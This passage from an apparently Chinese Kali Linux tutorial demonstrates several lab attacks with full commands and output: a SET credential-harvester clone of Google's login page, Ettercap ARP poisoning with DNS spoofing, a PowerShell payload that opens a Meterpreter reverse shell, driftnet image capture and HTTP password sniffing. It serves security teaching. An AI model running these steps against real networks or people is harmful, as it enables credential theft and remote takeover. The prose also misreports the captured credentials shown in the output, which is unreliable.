class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line"></span><br><span class="line">  1. Java Required</span><br><span class="line">  2. Google</span><br><span class="line">  3. Twitter</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt; Select a template:</span><br></pre></td></tr></table></figure><p>以上输出信息显示了SET默认提供的几个模板，包括Java Required、Google和Twitter。</p></li><li><p>这里选择Google站点模板，所以输入编号2，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:webattack&gt; Select a template:2</span><br><span class="line"></span><br><span class="line">[*] Cloning the website: http://www.google.com    <span class="comment">#克隆的站点</span></span><br><span class="line">[*] This could take a little bit...</span><br><span class="line"></span><br><span class="line">The best way to use this attack is <span class="keyword">if</span> username and password form fields are available. Regardless, this captures all POSTs on a website.</span><br><span class="line">[*] The Social-Engineer Toolkit Credential Harvester Attack</span><br><span class="line">[*] Credential Harvester is running on port 80</span><br><span class="line">[*] Information will be displayed to you as it arrives below:</span><br></pre></td></tr></table></figure><p>从以上输出的信息中可以看到，这里克隆的站点为 <a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a> 。接下来，攻击者还需要将目标用户诱骗到克隆的站点上。这样，当客户端登录克隆的网站时，提交的用户名和密码将被捕获。</p><p><code>当用户启动社会工程学攻击后，证书获取默认监听80端口。如果当前系统中运行了80端口的程序（如Apache），将会提示关闭该程序。</code></p><p>现在我们通过使用SET工具包，成功克隆了一个伪站点。此时，用户同样可以使用中间人攻击的方式，将目标用户诱骗到克隆的站点上。由于Web页面是通过DNS解析的，所以用户需要实施DNS欺骗。在Ettercap工具中，提供了一个dns_spoof插件，可以用来实施DNS欺骗。下面将介绍如何使用Ettercap工具实施ARP攻击和DNS欺骗，以将目标用户诱骗到伪站点页面。具体操作步骤如下：</p></li><li><p>修改Ettercap的DNS配置文件，指定欺骗的域名。其中，Ettercap的DNS配置文件为/etc/ettercap/etter.dns，内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.google.com A 192.168.100.186 3600</span><br><span class="line">*.*.*          A 192.168.100.186</span><br></pre></td></tr></table></figure><p>这里用户需要根据主机的环境进行配置。其中，本例中攻击主机的地址为192.168.100.186。</p></li><li><p>使用Ettercap发起ARP攻击，并启动dns_spoof插件，即可实施DNS欺骗。执行命令如下：</p><p>命令格式：</p><blockquote><p>ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /要欺骗的ip// /网关的ip//</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.100.115// /192.168.100.1//</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.100.115// /192.168.100.1//</span></span><br><span class="line"></span><br><span class="line">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 00:0C:29:CE:D2:12</span><br><span class="line">	  192.168.100.186/255.255.255.0</span><br><span class="line">	  fe80::20c:29ff:fece:d212/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid <span class="string">'redir_command_on'</span> script <span class="keyword">in</span> the etter.conf file</span><br><span class="line">Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not <span class="built_in">set</span> to 0.</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">  34 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">28230 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Scanning <span class="keyword">for</span> merged targets (2 hosts)...</span><br><span class="line"></span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">3 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : 192.168.100.115 98:8D:46:D1:77:57</span><br><span class="line"></span><br><span class="line"> GROUP 2 : 192.168.100.1 80:05:88:E6:74:7C</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit <span class="string">'h'</span> <span class="keyword">for</span> inline <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Activating dns_spoof plugin...</span><br><span class="line"></span><br><span class="line">dns_spoof: A [imap.163.com] spoofed to [192.168.100.186] TTL [3600 s]</span><br><span class="line">dns_spoof: A [www.baidu.com] spoofed to [192.168.100.186] TTL [3600 s]</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功实施了DNS欺骗。此时，当目标主机访问任何网页时，将被欺骗到攻击主机（192.168.100.186）创建的伪页面。</p></li><li><p>假设目标用户将访问腾讯站点 <a href="http://www.qq.com" target="_blank" rel="noopener">http://www.qq.com</a> ，将显示如下图所示的页面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8711.png" alt="图片11"></p></li><li><p>从图中可以看到，访问到的页面是登录Google服务器，但是，地址栏中请求的网址仍然是 <a href="http://www.qq.com/" target="_blank" rel="noopener">http://www.qq.com/</a> 。此时，当目标用户输入登录信息登录Google服务器时，其登录信息将被攻击主机捕获到，并在终端显示捕获到的信息。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.115 - - [29/Dec/2020 02:33:11] <span class="string">"GET / HTTP/1.1"</span> 200 -</span><br><span class="line">192.168.100.115 - - [29/Dec/2020 02:33:11] <span class="string">"GET /favicon.ico HTTP/1.1"</span> 404 -</span><br><span class="line">192.168.100.115 - - [29/Dec/2020 02:33:15] <span class="string">"GET /favicon.ico HTTP/1.1"</span> 404 -</span><br><span class="line">[*] WE GOT A HIT! Printing the output:</span><br><span class="line">PARAM: GALX=SJLCkfgaqoM</span><br><span class="line">PARAM: <span class="built_in">continue</span>=https://accounts.google.com/o/oauth2/auth?zt=ChRsWFBwd2JmV1hIcDhtUFdldzBENhIfVWsxSTdNLW9MdThibW1TMFQzVUZFc1BBaURuWmlRSQ%E2%88%99APsBz4gAAAAAUy4_qD7Hbfz38w8kxnaNouLcRiD3YTjX</span><br><span class="line">PARAM: service=lso</span><br><span class="line">PARAM: dsh=-7381887106725792428</span><br><span class="line">PARAM: _utf8=â</span><br><span class="line">PARAM: bgresponse=js_disabled</span><br><span class="line">PARAM: pstMsg=1</span><br><span class="line">PARAM: dnConn=</span><br><span class="line">PARAM: checkConnection=</span><br><span class="line">PARAM: checkedDomains=youtube</span><br><span class="line">POSSIBLE USERNAME FIELD FOUND: Email=chenzz@qq.com</span><br><span class="line">POSSIBLE PASSWORD FIELD FOUND: Passwd=abc.123</span><br><span class="line">PARAM: signIn=Sign+<span class="keyword">in</span></span><br><span class="line">PARAM: PersistentCookie=yes</span><br><span class="line">[*] WHEN YOU<span class="string">'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.</span></span><br></pre></td></tr></table></figure><p>从以上输出信息中可以看到，默认将生成的文件保存在/root/.set//reports目录中。此时，按回车键继续操作，将返回SET的菜单选项界面。</p></li></ol><h3 id="2-3-PowerShell攻击向量"><a href="#2-3-PowerShell攻击向量" class="headerlink" title="2.3 PowerShell攻击向量"></a>2.3 PowerShell攻击向量</h3><p>PowerShell攻击向量可以创建一个PowerShell文件。当用户将创建好的PowerShell文件发送给目标，并且目标用户执行了该文件，将可以获取一个反向远程连接。</p><p>实施PowerShell攻击向量。具体操作步骤如下：</p><ol><li><p>启动社会工程学攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; setoolkit</span><br><span class="line"></span><br><span class="line">   1) Social-Engineering Attacks</span><br><span class="line">   2) Penetration Testing (Fast-Track)</span><br><span class="line">   3) Third Party Modules</span><br><span class="line">   4) Update the Social-Engineer Toolkit</span><br><span class="line">   5) Update SET configuration</span><br><span class="line">   6) Help, Credits, and About</span><br><span class="line"></span><br><span class="line">  99) Exit the Social-Engineer Toolkit</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p>选择社会工程学攻击，输入编号1。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line">   1) Spear-Phishing Attack Vectors</span><br><span class="line">   2) Website Attack Vectors</span><br><span class="line">   3) Infectious Media Generator</span><br><span class="line">   4) Create a Payload and Listener</span><br><span class="line">   5) Mass Mailer Attack</span><br><span class="line">   6) Arduino-Based Attack Vector</span><br><span class="line">   7) Wireless Access Point Attack Vector</span><br><span class="line">   8) QRCode Generator Attack Vector</span><br><span class="line">   9) Powershell Attack Vectors</span><br><span class="line">  10) Third Party Modules</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p>选择Powershell攻击向量，输入编号9。将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; 9</span><br><span class="line"></span><br><span class="line">The Powershell Attack Vector module allows you to create PowerShell specific attacks. These attacks will allow you to use PowerShell <span class="built_in">which</span> is available by default <span class="keyword">in</span> all operating systems Windows Vista and above. PowerShell provides a fruitful  landscape <span class="keyword">for</span> deploying payloads and performing <span class="built_in">functions</span> that  <span class="keyword">do</span> not get triggered by preventative technologies.</span><br><span class="line"></span><br><span class="line">   1) Powershell Alphanumeric Shellcode Injector</span><br><span class="line">   2) Powershell Reverse Shell</span><br><span class="line">   3) Powershell Bind Shell</span><br><span class="line">   4) Powershell Dump SAM Database</span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:powershell&gt;</span><br></pre></td></tr></table></figure></li><li><p>选择含字符和数字的Shellcode注入，输入编号1。将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:powershell&gt;1</span><br><span class="line">Enter the IPAddress or DNS name <span class="keyword">for</span> the reverse host: 192.168.10.75</span><br><span class="line"><span class="built_in">set</span>:powershell&gt; Enter the port <span class="keyword">for</span> the reverse [443]:4444</span><br><span class="line">[*] Prepping the payload <span class="keyword">for</span> delivery and injecting alphanumeric shellcode...</span><br><span class="line">[*] Generating x86-based powershell injection code...</span><br><span class="line">[*] Reverse_HTTPS takes a few seconds to calculate..One moment..</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 394 bytes</span><br><span class="line">Final size of c file: 1681 bytes</span><br><span class="line">[*] Finished generating powershell injection bypass.</span><br><span class="line">[*] Encoded to bypass execution restriction policy...</span><br><span class="line">[*] If you want the powershell commands and attack, they are exported to /root/.<span class="built_in">set</span>/reports/powershell/</span><br><span class="line"><span class="built_in">set</span>&gt; Do you want to start the listener now [yes/no]: : yes</span><br><span class="line"></span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line">Metasploit tip: Use the resource <span class="built_in">command</span> to run</span><br><span class="line">commands from a file</span><br><span class="line"></span><br><span class="line">[*] Processing /root/.<span class="built_in">set</span>/reports/powershell/powershell.rc <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; use multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; <span class="built_in">set</span> LHOST 0.0.0.0</span><br><span class="line">LHOST =&gt; 0.0.0.0</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">ExitOnSession =&gt; <span class="literal">false</span></span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br><span class="line">[*] Started HTTPS reverse handler on https://0.0.0.0:4444</span><br></pre></td></tr></table></figure><p>以上输出信息显示了攻击主机的配置信息。此时已经成功启动了攻击载荷，等待目标主机的连接。以上设置完成后，将会在/root/.set/reports/powershell/目录下创建了一个渗透攻击代码文件。该文件是一个文本文件，其文件名为x86_powershell_injection.txt。</p></li><li><p>此时，可以将x86_powershell_injection.txt文件中的内容复制到目标主机（Windows 7）的DOS下，运行该脚本内容。或者，直接将该文件复制到目标主机，并将文件的后缀名改为.bat。然后，双击该文件即可运行该脚本。执行成功后，Kali主机将会显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] https://0.0.0.0:4444 handling request from 192.168.10.75; (UUID: raob2xub)</span><br><span class="line"> Staging x86 payload (958531 bytes) ...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.10.75:4444 -&gt; 192.168.10.77:</span><br><span class="line">38128) at 2020-12-28 16:12:03 +0800</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功打开了一个Meterpreter会话。此时，使用sessions命令即可查看建立的会话连接，具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>以上代码中看到，命令行提示符显示为meterpreter&gt;，说明成功启动了Meterpreter会话。接下来，用户则可以利用Meterpreter中支持的命令，以获取目标主机更多的信息。</p></li></ol><h2 id="三、捕获和监听网络数据"><a href="#三、捕获和监听网络数据" class="headerlink" title="三、捕获和监听网络数据"></a>三、捕获和监听网络数据</h2><p>当用户成功实施中间人攻击后，即可捕获和监听目标主机的网络数据。</p><h3 id="3-1-通用抓包工具Wireshark"><a href="#3-1-通用抓包工具Wireshark" class="headerlink" title="3.1 通用抓包工具Wireshark"></a>3.1 通用抓包工具Wireshark</h3><p>Wireshark是一款专用于网络封包的工具，可以用来捕获并分析数据包。当用户实施中间人攻击后，可以使用Wireshark来监听目标主机流经网络中的数据包。下面将介绍使用Wireshark工具捕获数据包的方法。</p><p>使用Wireshark监听目标主机的数据包。具体操作步骤如下：</p><ol><li><p>实施中间人攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote  /192.168.10.75// /192.168.10.1//</span></span><br></pre></td></tr></table></figure></li><li><p>启动Wireshark工具。在菜单栏中依次选择“应用程序”|“嗅探/欺骗”|wireshark命令，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8712.png" alt="图片12"></p></li><li><p>在该界面中选择监听接口eth0。然后，单击开始捕获分组按钮，将开始捕获数据包，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8713.png" alt="图片13"></p></li><li><p>此时，正在监听经过接口eth0的所有数据包。当捕获到足够的数据包后，单击停止捕获分组按钮，将停止捕获数据包，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8714.png" alt="图片14"></p></li><li><p>将捕获的包保存到捕获文件中。在菜单栏依次选择“文件”|“保存”命令，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8715.png" alt="图片15"></p></li><li><p>在该界面中指定捕获文件名称及位置。然后，单击“保存”按钮，即可成功保存捕获的数据包。</p></li></ol><h3 id="3-2-捕获图片"><a href="#3-2-捕获图片" class="headerlink" title="3.2 捕获图片"></a>3.2 捕获图片</h3><p>当用户成功实施中间人攻击后，可以使用driftnet工具来捕获图片。driftnet是一款简单而实用的图片捕获工具，可以很方便地在网络数据包中抓取图片。通过与Ettercap工具配合使用，可以捕获目标主机浏览的所有图片。</p><p>driftnet工具的语法格式如下：</p><blockquote><p>driftnet [选项]</p></blockquote><p>其中，该工具可用的选项及含义如下：</p><blockquote><p>-b：捕获到新的图片时发出嘟嘟声。<br>-i interface：指定监听接口。<br>-f file：读取一个指定pcap数据包中的图片。<br>-a：后台模式。将捕获到的图片保存到目录中，即不显示在屏幕上。<br>-m number：指定保存图片的数目。<br>-d directory：指定一个临时目录，用来保存捕获到的图片。当退出driftnet工具后，将清除该目录中的临时文件。但是，不会删除其他文件。<br>-x prefix：指定保存图片的前缀名称。默认情况下，图片的前缀名称为driftnet-。</p></blockquote><p>使用driftnet工具捕获目标主机浏览的所有图片。具体操作步骤如下：</p><ol><li><p>使用Ettercap实施中间人攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote /192.168.10.77// /192.168.10.1//</span></span><br><span class="line"></span><br><span class="line">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Actual changes:</span><br><span class="line">tx-generic-segmentation: off</span><br><span class="line">rx-gro: off</span><br><span class="line">rx-lro: on [requested off]</span><br><span class="line">tx-tcp-segmentation: off</span><br><span class="line">tx-tcp-ecn-segmentation: off</span><br><span class="line">tx-tcp6-segmentation: off</span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 52:54:00:BF:D0:AC</span><br><span class="line">	  192.168.10.75/255.255.255.0</span><br><span class="line">	  fe80::5054:ff:febf:d0ac/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid <span class="string">'redir_command_on'</span> script <span class="keyword">in</span> the etter.conf file</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">  34 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">28230 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Scanning <span class="keyword">for</span> merged targets (2 hosts)...</span><br><span class="line"></span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">2 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : 192.168.10.77 52:54:00:47:0E:45</span><br><span class="line"></span><br><span class="line"> GROUP 2 : 192.168.10.1 80:05:88:E6:74:7C</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit <span class="string">'h'</span> <span class="keyword">for</span> inline <span class="built_in">help</span></span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功对目标实施了ARP欺骗。接下来，用户就可以使用driftnet工具监听目标主机的图片了。</p></li><li><p>使用driftnet开始监听目标主机浏览的所有图片，并指定将监听的图片临时保存到/root/image目录中。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># driftnet -i eth0 -d /root/image/</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将弹出一个driftnet终端窗口，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8716.png" alt="图片16"></p></li><li><p>当捕获到目标主机浏览的图片时，显示在如下图所示的窗口中。而且，在driftnet监听的交互模式下也可以看到捕获到的图片信息。如下：</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8717.png" alt="图片17"></p><p>从以上显示的信息中可以看到捕获到的图片信息。此时，用户进入到指定的图片保存位置/root/image目录中，即可看到捕获到的所有图片。</p></li><li><p>从该界面可以看到捕获到的图片。如果用户不希望再捕获图片，按Ctrl+C组合键可以停止监听。</p></li></ol><h3 id="3-3-监听HTTP数据"><a href="#3-3-监听HTTP数据" class="headerlink" title="3.3 监听HTTP数据"></a>3.3 监听HTTP数据</h3><p>HTTP（Hyper Text Transfer Protocol，超文本传输协议），是用于Web服务器传输超文本到本地浏览器的传送协议。通常情况下，客户端访问网页都使用的是HTTP协议。所以，用户通过使用中间人攻击，也可以监听目标用户访问的HTTP数据。由于HTTP协议是以明文方式传输数据，如果用户登录HTTP协议网站，将会监听到用户信息。下面将介绍使用Ettercap工具嗅探HTTP协议数据的方法。</p><p>使用Ettercap工具嗅探HTTP数据。具体操作步骤如下：</p><ol><li><p>使用Ettercap工具对目标实施中间人攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote /192.168.100.115// /192.168.100.1//</span></span><br><span class="line"></span><br><span class="line">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 00:0C:29:CE:D2:12</span><br><span class="line">	  192.168.100.186/255.255.255.0</span><br><span class="line">	  fe80::20c:29ff:fece:d212/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid <span class="string">'redir_command_on'</span> script <span class="keyword">in</span> the etter.conf file</span><br><span class="line">Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not <span class="built_in">set</span> to 0.</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">  34 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">28230 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Scanning <span class="keyword">for</span> merged targets (2 hosts)...</span><br><span class="line"></span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">4 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : 192.168.100.115 98:8D:46:D1:77:57</span><br><span class="line"></span><br><span class="line"> GROUP 2 : 192.168.100.1 80:05:88:E6:74:7C</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit <span class="string">'h'</span> <span class="keyword">for</span> inline <span class="built_in">help</span></span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功对目标实施了ARP欺骗攻击。</p></li><li><p>此时，当目标主机访问HTTP协议网站时，将会被攻击主机监听到。例如，这里登录ChinaUNIX论坛，当用户输入登录信息并进行登录后，将被攻击主机监听到。如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP : <span class="number">42.62</span><span class="number">.98</span><span class="number">.167</span>:<span class="number">80</span> -&gt; USER: chenzhongzhou  PASS: Abc<span class="number">.123456</span>  INFO: http:<span class="comment">//account.chinaunix.net/login/?url=http://bbs.chinaunix.net/</span></span><br><span class="line">CONTENT: username=chenzz&amp;password=<span class="number">123456</span>&amp;_token=jnPdiGJavZX3JP5FCS8DZ8Pz1FWFNxgAD9gdxo31&amp;_t=<span class="number">1609298162685</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，监听到了目标主机访问ChinaUNIX论坛的登录信息，用户名为testuser，密码为password。</p></li></ol><h3 